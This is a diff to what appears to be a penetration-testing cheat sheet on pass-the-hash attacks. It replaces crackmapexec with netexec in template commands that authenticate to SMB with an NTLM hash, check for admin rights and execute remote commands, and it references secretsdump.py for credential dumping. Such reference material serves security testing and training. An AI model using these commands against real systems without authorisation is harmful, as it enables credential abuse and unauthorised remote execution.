@@ -35,19 +35,19 @@ secretsdump.py <target_user>@<target_ip>
 | `<NTLM_hash>` |  Hash (format: `<LM_Hash>:<NT_Hash>` or just `<NT_Hash>`). |
 
 ```bash
-crackmapexec smb <target_ip> -u <username> -H <NTLM_hash>
+netexec smb <target_ip> -u <username> -H <NTLM_hash>
 ```
 
 **Check for Administrative Access**: To see if the hash provides administrative privileges:
 
 ```bash
-crackmapexec smb <target_ip> -u <username> -H <NTLM_hash> --admin
+netexec smb <target_ip> -u <username> -H <NTLM_hash> --admin
 ```
 
 **Execute Commands**: If administrative access is confirmed, you can execute commands:
 
 ```bash
-crackmapexec smb <target_ip> -u <username> -H <NTLM_hash> -x "whoami"
+netexec smb <target_ip> -u <username> -H <NTLM_hash> -x "whoami"
 ```
 
 #### Using Metasploit
